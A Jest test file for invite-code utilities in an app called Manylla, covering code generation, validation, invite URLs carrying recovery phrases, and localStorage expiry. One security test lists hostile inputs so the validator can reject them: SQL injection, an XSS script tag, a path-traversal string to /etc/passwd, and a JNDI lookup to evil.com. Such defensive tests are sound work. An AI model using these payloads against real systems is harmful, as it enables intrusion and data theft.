import {
  generateInviteCode,
  validateInviteCode,
  normalizeInviteCode,
  generateInviteUrl,
  parseInviteUrl,
  storeInviteCode,
  getInviteCode,
  cleanupExpiredInvites,
} from "../inviteCode";

// Mock localStorage
const localStorageMock = {
  getItem: jest.fn(),
  setItem: jest.fn(),
  removeItem: jest.fn(),
  clear: jest.fn(),
};

// Set up global localStorage mock
Object.defineProperty(global, "localStorage", {
  value: localStorageMock,
  writable: true,
});

// We'll mock window.location.origin using jest spy

describe("inviteCode utilities", () => {
  // Mock console.warn to avoid noise during tests
  const originalConsoleWarn = console.warn;

  beforeAll(() => {
    console.warn = jest.fn();
  });

  afterAll(() => {
    console.warn = originalConsoleWarn;
  });

  beforeEach(() => {
    jest.clearAllMocks();
    localStorageMock.getItem.mockReturnValue("{}");
    localStorageMock.setItem.mockClear();
  });

  describe("generateInviteCode", () => {
    it("should generate code in XXXX-XXXX format", () => {
      const code = generateInviteCode();

      expect(code).toMatch(
        /^[ABCDEFGHJKMNPQRSTUVWXYZ23456789]{4}-[ABCDEFGHJKMNPQRSTUVWXYZ23456789]{4}$/,
      );
      expect(code).toHaveLength(9); // 8 chars + 1 dash
    });

    it("should generate unique codes", () => {
      const codes = new Set();

      // Generate 100 codes and check uniqueness
      for (let i = 0; i < 100; i++) {
        codes.add(generateInviteCode());
      }

      // Should be very unlikely to have duplicates in 100 generations
      expect(codes.size).toBeGreaterThan(95);
    });

    it("should not contain confusing characters", () => {
      const confusingChars = ["0", "O", "1", "I", "L"];

      for (let i = 0; i < 50; i++) {
        const code = generateInviteCode();

        confusingChars.forEach((char) => {
          expect(code).not.toContain(char);
        });
      }
    });

    it("should only use allowed characters", () => {
      const allowedChars = "ABCDEFGHJKMNPQRSTUVWXYZ23456789-";

      for (let i = 0; i < 20; i++) {
        const code = generateInviteCode();

        for (const char of code) {
          expect(allowedChars).toContain(char);
        }
      }
    });
  });

  describe("validateInviteCode", () => {
    it("should validate correct format codes", () => {
      const validCodes = [
        "ABCD-2345",
        "ZYXW-9876",
        "H3G2-N5P4",
        "abcd-2345", // Lowercase should be valid after normalization
        " ABCD-2345 ", // With spaces should be valid
      ];

      validCodes.forEach((code) => {
        expect(validateInviteCode(code)).toBe(true);
      });
    });

    it("should reject invalid format codes", () => {
      const invalidCodes = [
        "ABCD1234", // Missing dash
        "ABC-1234", // Too few chars before dash
        "ABCD-123", // Too few chars after dash
        "ABCDE-1234", // Too many chars before dash
        "ABCD-12345", // Too many chars after dash
        "AB-CD-1234", // Extra dash
        "ABCD-", // Missing chars after dash
        "-1234", // Missing chars before dash
        "", // Empty string
        "1234-ABCD", // Numbers first (still valid format but testing)
        "ABCD-12O4", // Contains confusing character O
        "ABC1-1234", // Contains confusing character 1
        "ABCI-1234", // Contains confusing character I
      ];

      // Filter out actually valid codes from our "invalid" list
      const actuallyInvalidCodes = invalidCodes.filter((code) => {
        // '1234-ABCD' is actually valid format, so exclude it
        if (code === "1234-ABCD") return false;
        return true;
      });

      actuallyInvalidCodes.forEach((code) => {
        expect(validateInviteCode(code)).toBe(false);
      });
    });

    it("should handle confusing character validation", () => {
      const codesWithConfusingChars = [
        "ABCD-12O4", // Contains O
        "ABC1-1234", // Contains 1
        "ABCI-1234", // Contains I
        "ABCL-1234", // Contains L
      ];

      codesWithConfusingChars.forEach((code) => {
        expect(validateInviteCode(code)).toBe(false);
      });
    });

    it("should be case insensitive", () => {
      expect(validateInviteCode("abcd-2345")).toBe(true);
      expect(validateInviteCode("ABCD-2345")).toBe(true);
      expect(validateInviteCode("AbCd-2345")).toBe(true);
    });

    it("should handle whitespace", () => {
      expect(validateInviteCode(" ABCD-2345 ")).toBe(true);
      expect(validateInviteCode("\tABCD-2345\n")).toBe(true);
    });
  });

  describe("normalizeInviteCode", () => {
    it("should convert to uppercase", () => {
      expect(normalizeInviteCode("abcd-2345")).toBe("ABCD-2345");
      expect(normalizeInviteCode("AbCd-2345")).toBe("ABCD-2345");
    });

    it("should trim whitespace", () => {
      expect(normalizeInviteCode(" ABCD-2345 ")).toBe("ABCD-2345");
      expect(normalizeInviteCode("\tABCD-2345\n")).toBe("ABCD-2345");
    });

    it("should remove internal spaces", () => {
      expect(normalizeInviteCode("AB CD-23 45")).toBe("ABCD-2345");
      expect(normalizeInviteCode("A B C D - 2 3 4 5")).toBe("ABCD-2345");
    });

    it("should handle empty and null inputs", () => {
      expect(normalizeInviteCode("")).toBe("");
      expect(normalizeInviteCode("   ")).toBe("");
    });
  });

  describe("generateInviteUrl", () => {
    it("should generate correct URL format", () => {
      const inviteCode = "ABCD-2345";
      const recoveryPhrase = "test-recovery-phrase";

      const url = generateInviteUrl(
        inviteCode,
        recoveryPhrase,
        "https://manylla.com",
      );

      expect(url).toBe(
        "https://manylla.com/sync/ABCD-2345#test-recovery-phrase",
      );
    });

    it("should handle special characters in recovery phrase", () => {
      const inviteCode = "XYZA-9876";
      const recoveryPhrase = "phrase-with-special-chars_123";

      const url = generateInviteUrl(
        inviteCode,
        recoveryPhrase,
        "https://manylla.com",
      );

      expect(url).toBe(
        "https://manylla.com/sync/XYZA-9876#phrase-with-special-chars_123",
      );
    });

    it("should use window.location.origin when no baseUrl provided", () => {
      // Without baseUrl parameter, should use default window.location.origin
      const url = generateInviteUrl("TEST-1234", "phrase");

      // JSDOM provides 'http://localhost' by default
      expect(url).toBe("http://localhost/sync/TEST-1234#phrase");
    });
  });

  describe("parseInviteUrl", () => {
    it("should parse valid invite URLs", () => {
      const pathname = "/sync/ABCD-1234";
      const hash = "#recovery-phrase-data";

      const result = parseInviteUrl(pathname, hash);

      expect(result.inviteCode).toBe("ABCD-1234");
      expect(result.recoveryPhrase).toBe("recovery-phrase-data");
    });

    it("should handle lowercase invite codes", () => {
      const pathname = "/sync/abcd-1234";
      const hash = "#recovery-phrase";

      const result = parseInviteUrl(pathname, hash);

      expect(result.inviteCode).toBe("ABCD-1234"); // Should convert to uppercase
      expect(result.recoveryPhrase).toBe("recovery-phrase");
    });

    it("should return null for invalid pathnames", () => {
      const invalidPathnames = [
        "/sync/ABCD1234", // Missing dash
        "/sync/ABC-1234", // Invalid format
        "/profile/ABCD-1234", // Wrong path
        "/sync/", // Missing code
        "/sync", // Missing code and slash
      ];

      invalidPathnames.forEach((pathname) => {
        const result = parseInviteUrl(pathname, "#phrase");
        expect(result.inviteCode).toBe(null);
      });
    });

    it("should return null for missing hash", () => {
      const result = parseInviteUrl("/sync/ABCD-1234", "");

      expect(result.inviteCode).toBe("ABCD-1234");
      expect(result.recoveryPhrase).toBe(null);
    });

    it("should handle hash without # prefix", () => {
      const result = parseInviteUrl("/sync/ABCD-1234", "no-hash-prefix");

      expect(result.recoveryPhrase).toBe(null);
    });

    it("should handle empty hash", () => {
      const result = parseInviteUrl("/sync/ABCD-1234", "#");

      expect(result.inviteCode).toBe("ABCD-1234");
      expect(result.recoveryPhrase).toBe("");
    });

    it("should handle complex recovery phrases", () => {
      const hash = "#a1b2c3d4e5f6789012345678abcdef01";
      const result = parseInviteUrl("/sync/TEST-5678", hash);

      expect(result.recoveryPhrase).toBe("a1b2c3d4e5f6789012345678abcdef01");
    });
  });

  describe("storeInviteCode", () => {
    it("should store invite code data", () => {
      const inviteCode = "ABCD-2345";
      const syncId = "test-sync-id";
      const recoveryPhrase = "test-recovery-phrase";

      storeInviteCode(inviteCode, syncId, recoveryPhrase);

      expect(localStorageMock.setItem).toHaveBeenCalledWith(
        "manylla_invites",
        expect.stringContaining('"ABCD-2345"'),
      );

      // Check the stored data structure
      const storedCall = localStorageMock.setItem.mock.calls[0][1];
      const storedData = JSON.parse(storedCall);

      expect(storedData[inviteCode]).toMatchObject({
        syncId,
        recoveryPhrase,
        createdAt: expect.any(Number),
        expiresAt: expect.any(Number),
      });

      expect(storedData[inviteCode].expiresAt).toBeGreaterThan(
        storedData[inviteCode].createdAt,
      );
    });

    it("should set 24-hour expiration", () => {
      const now = Date.now();
      const expectedExpiry = now + 24 * 60 * 60 * 1000;

      // Mock Date.now to return consistent value
      const originalDateNow = Date.now;
      Date.now = jest.fn(() => now);

      storeInviteCode("TEST-1234", "sync-id", "phrase");

      const storedCall = localStorageMock.setItem.mock.calls[0][1];
      const storedData = JSON.parse(storedCall);

      expect(storedData["TEST-1234"].expiresAt).toBe(expectedExpiry);

      // Restore Date.now
      Date.now = originalDateNow;
    });

    it("should handle existing invites", () => {
      // Mock existing data
      localStorageMock.getItem.mockReturnValue(
        JSON.stringify({
          "EXISTING-123": {
            syncId: "existing-sync",
            recoveryPhrase: "existing-phrase",
            createdAt: Date.now(),
            expiresAt: Date.now() + 24 * 60 * 60 * 1000,
          },
        }),
      );

      storeInviteCode("NEW-5678", "new-sync", "new-phrase");

      const storedCall = localStorageMock.setItem.mock.calls[0][1];
      const storedData = JSON.parse(storedCall);

      expect(Object.keys(storedData)).toHaveLength(2);
      expect(storedData["EXISTING-123"]).toBeDefined();
      expect(storedData["NEW-5678"]).toBeDefined();
    });
  });

  describe("getInviteCode", () => {
    it("should retrieve valid invite code data", () => {
      const testInvite = {
        "ABCD-1234": {
          syncId: "test-sync-id",
          recoveryPhrase: "test-phrase",
          createdAt: Date.now() - 1000,
          expiresAt: Date.now() + 60000, // 1 minute in future
        },
      };

      localStorageMock.getItem.mockReturnValue(JSON.stringify(testInvite));

      const result = getInviteCode("ABCD-1234");

      expect(result).toEqual({
        syncId: "test-sync-id",
        recoveryPhrase: "test-phrase",
      });
    });

    it("should return null for non-existent invite codes", () => {
      localStorageMock.getItem.mockReturnValue("{}");

      const result = getInviteCode("NONEXISTENT-123");

      expect(result).toBe(null);
    });

    it("should return null and clean up expired invite codes", () => {
      const expiredInvite = {
        "EXPIRED-123": {
          syncId: "expired-sync-id",
          recoveryPhrase: "expired-phrase",
          createdAt: Date.now() - 48 * 60 * 60 * 1000, // 48 hours ago
          expiresAt: Date.now() - 24 * 60 * 60 * 1000, // 24 hours ago (expired)
        },
      };

      localStorageMock.getItem.mockReturnValue(JSON.stringify(expiredInvite));

      const result = getInviteCode("EXPIRED-123");

      expect(result).toBe(null);

      // Should clean up expired invite
      expect(localStorageMock.setItem).toHaveBeenCalledWith(
        "manylla_invites",
        "{}", // Empty object after cleanup
      );
    });

    it("should normalize invite codes", () => {
      const testInvite = {
        "ABCD-1234": {
          syncId: "test-sync-id",
          recoveryPhrase: "test-phrase",
          createdAt: Date.now(),
          expiresAt: Date.now() + 60000,
        },
      };

      localStorageMock.getItem.mockReturnValue(JSON.stringify(testInvite));

      // Test various formats that should normalize to ABCD-1234
      const validFormats = ["abcd-1234", " ABCD-1234 ", "AB CD-12 34"];

      validFormats.forEach((format) => {
        const result = getInviteCode(format);
        expect(result).toEqual({
          syncId: "test-sync-id",
          recoveryPhrase: "test-phrase",
        });
      });
    });

    it("should handle malformed localStorage data", () => {
      localStorageMock.getItem.mockReturnValue("invalid-json");

      // Should not throw error, should return null
      const result = getInviteCode("ABCD-1234");

      expect(result).toBe(null);
    });

    it("should handle missing localStorage", () => {
      localStorageMock.getItem.mockReturnValue(null);

      const result = getInviteCode("ABCD-1234");

      expect(result).toBe(null);
    });
  });

  describe("cleanupExpiredInvites", () => {
    it("should remove expired invites", () => {
      const now = Date.now();
      const mixedInvites = {
        "VALID-1234": {
          syncId: "valid-sync",
          recoveryPhrase: "valid-phrase",
          createdAt: now - 1000,
          expiresAt: now + 60000, // Future
        },
        "EXPIRED-567": {
          syncId: "expired-sync",
          recoveryPhrase: "expired-phrase",
          createdAt: now - 48 * 60 * 60 * 1000,
          expiresAt: now - 1000, // Past
        },
        "ANOTHER-890": {
          syncId: "valid-sync-2",
          recoveryPhrase: "valid-phrase-2",
          createdAt: now - 2000,
          expiresAt: now + 120000, // Future
        },
      };

      localStorageMock.getItem.mockReturnValue(JSON.stringify(mixedInvites));

      cleanupExpiredInvites();

      const storedCall = localStorageMock.setItem.mock.calls[0][1];
      const cleanedData = JSON.parse(storedCall);

      expect(Object.keys(cleanedData)).toHaveLength(2);
      expect(cleanedData["VALID-1234"]).toBeDefined();
      expect(cleanedData["ANOTHER-890"]).toBeDefined();
      expect(cleanedData["EXPIRED-567"]).toBeUndefined();
    });

    it("should handle all expired invites", () => {
      const now = Date.now();
      const allExpired = {
        "EXPIRED-123": {
          expiresAt: now - 1000,
        },
        "EXPIRED-456": {
          expiresAt: now - 2000,
        },
      };

      localStorageMock.getItem.mockReturnValue(JSON.stringify(allExpired));

      cleanupExpiredInvites();

      const storedCall = localStorageMock.setItem.mock.calls[0][1];
      const cleanedData = JSON.parse(storedCall);

      expect(Object.keys(cleanedData)).toHaveLength(0);
    });

    it("should handle no expired invites", () => {
      const now = Date.now();
      const allValid = {
        "VALID-123": {
          expiresAt: now + 60000,
        },
        "VALID-456": {
          expiresAt: now + 120000,
        },
      };

      localStorageMock.getItem.mockReturnValue(JSON.stringify(allValid));

      cleanupExpiredInvites();

      const storedCall = localStorageMock.setItem.mock.calls[0][1];
      const cleanedData = JSON.parse(storedCall);

      expect(Object.keys(cleanedData)).toHaveLength(2);
      expect(cleanedData).toEqual(allValid);
    });

    it("should handle empty invite storage", () => {
      localStorageMock.getItem.mockReturnValue("{}");

      cleanupExpiredInvites();

      const storedCall = localStorageMock.setItem.mock.calls[0][1];
      expect(storedCall).toBe("{}");
    });

    it("should handle malformed storage data", () => {
      localStorageMock.getItem.mockReturnValue("invalid-json");

      // Should not throw error
      expect(() => cleanupExpiredInvites()).not.toThrow();

      // Should store empty object as fallback
      expect(localStorageMock.setItem).toHaveBeenCalledWith(
        "manylla_invites",
        "{}",
      );
    });
  });

  describe("edge cases and security", () => {
    it("should handle SQL injection attempts in invite codes", () => {
      const maliciousCodes = [
        "'; DROP TABLE invites; --",
        '<script>alert("xss")</script>',
        "../../../../etc/passwd",
        // eslint-disable-next-line no-template-curly-in-string
        "${jndi:ldap://evil.com/a}",
      ];

      maliciousCodes.forEach((code) => {
        expect(validateInviteCode(code)).toBe(false);
      });
    });

    it("should handle very long invite codes", () => {
      const longCode = "A".repeat(1000) + "-" + "1".repeat(1000);

      expect(validateInviteCode(longCode)).toBe(false);
    });

    it("should handle unicode characters", () => {
      const unicodeCodes = [
        "ÄBCD-1234",
        "ABCD-123Ω",
        "你好-世界",
        "ABCD-12🔥4",
      ];

      unicodeCodes.forEach((code) => {
        expect(validateInviteCode(code)).toBe(false);
      });
    });

    it("should handle concurrent storage operations", () => {
      // Simulate concurrent calls
      storeInviteCode("CODE-001", "sync1", "phrase1");
      storeInviteCode("CODE-002", "sync2", "phrase2");

      // Should have been called twice
      expect(localStorageMock.setItem).toHaveBeenCalledTimes(2);
    });

    it("should handle storage quota exceeded", () => {
      localStorageMock.setItem.mockImplementation(() => {
        throw new Error("QuotaExceededError");
      });

      // Should not throw error from our functions
      expect(() =>
        storeInviteCode("TEST-1234", "sync", "phrase"),
      ).not.toThrow();
    });

    it("should validate character set entropy", () => {
      const ALLOWED_CHARS = "ABCDEFGHJKMNPQRSTUVWXYZ23456789";
      expect(ALLOWED_CHARS).toHaveLength(31); // Good entropy, 31 characters

      // Test that all generated codes use only these characters
      for (let i = 0; i < 10; i++) {
        const code = generateInviteCode().replace("-", "");

        for (const char of code) {
          expect(ALLOWED_CHARS).toContain(char);
        }
      }
    });

    it("should handle time manipulation attempts", () => {
      const originalDateNow = Date.now;

      try {
        // Store an invite
        Date.now = jest.fn(() => 1000000); // Fixed time
        storeInviteCode("TIME-TEST", "sync-id", "phrase");

        // Try to retrieve after "time travel"
        Date.now = jest.fn(() => 2000000); // Still valid
        localStorageMock.getItem.mockReturnValue(
          JSON.stringify({
            "TIME-TEST": {
              syncId: "sync-id",
              recoveryPhrase: "phrase",
              createdAt: 1000000,
              expiresAt: 1000000 + 24 * 60 * 60 * 1000,
            },
          }),
        );

        let result = getInviteCode("TIME-TEST");
        expect(result).not.toBe(null);

        // Time travel beyond expiration
        Date.now = jest.fn(() => 1000000 + 25 * 60 * 60 * 1000); // 25 hours later

        result = getInviteCode("TIME-TEST");
        expect(result).toBe(null);
      } finally {
        Date.now = originalDateNow;
      }
    });
  });

  describe("integration scenarios", () => {
    it("should handle complete invite flow", () => {
      // Generate invite code
      const inviteCode = generateInviteCode();
      expect(validateInviteCode(inviteCode)).toBe(true);

      // Store invite data
      const syncId = "integration-sync-id";
      const recoveryPhrase = "integration-recovery-phrase";
      storeInviteCode(inviteCode, syncId, recoveryPhrase);

      // Generate and parse URL
      const url = generateInviteUrl(
        inviteCode,
        recoveryPhrase,
        "https://manylla.com",
      );
      const urlParts = new URL(url);
      const { inviteCode: parsedCode, recoveryPhrase: parsedPhrase } =
        parseInviteUrl(urlParts.pathname, urlParts.hash);

      expect(parsedCode).toBe(inviteCode);
      expect(parsedPhrase).toBe(recoveryPhrase);

      // Retrieve stored data
      localStorageMock.getItem.mockReturnValue(
        JSON.stringify({
          [inviteCode]: {
            syncId,
            recoveryPhrase,
            createdAt: Date.now(),
            expiresAt: Date.now() + 24 * 60 * 60 * 1000,
          },
        }),
      );

      const retrievedData = getInviteCode(parsedCode);
      expect(retrievedData).toEqual({ syncId, recoveryPhrase });
    });

    it("should handle invite code lifecycle", () => {
      const inviteCode = "LIFE-CYCLE";
      const now = Date.now();

      // Mock Date.now for consistent testing
      const originalDateNow = Date.now;
      Date.now = jest.fn(() => now);

      try {
        // Store invite
        storeInviteCode(inviteCode, "sync-id", "phrase");

        // Verify storage
        const storedCall = localStorageMock.setItem.mock.calls[0][1];
        const storedData = JSON.parse(storedCall);
        expect(storedData[inviteCode]).toBeDefined();

        // Mock retrieval before expiration
        localStorageMock.getItem.mockReturnValue(JSON.stringify(storedData));
        Date.now = jest.fn(() => now + 60000); // 1 minute later

        let result = getInviteCode(inviteCode);
        expect(result).not.toBe(null);

        // Mock retrieval after expiration
        Date.now = jest.fn(() => now + 25 * 60 * 60 * 1000); // 25 hours later

        result = getInviteCode(inviteCode);
        expect(result).toBe(null);

        // Verify cleanup occurred
        expect(localStorageMock.setItem).toHaveBeenCalledWith(
          "manylla_invites",
          "{}",
        );
      } finally {
        Date.now = originalDateNow;
      }
    });
  });
});
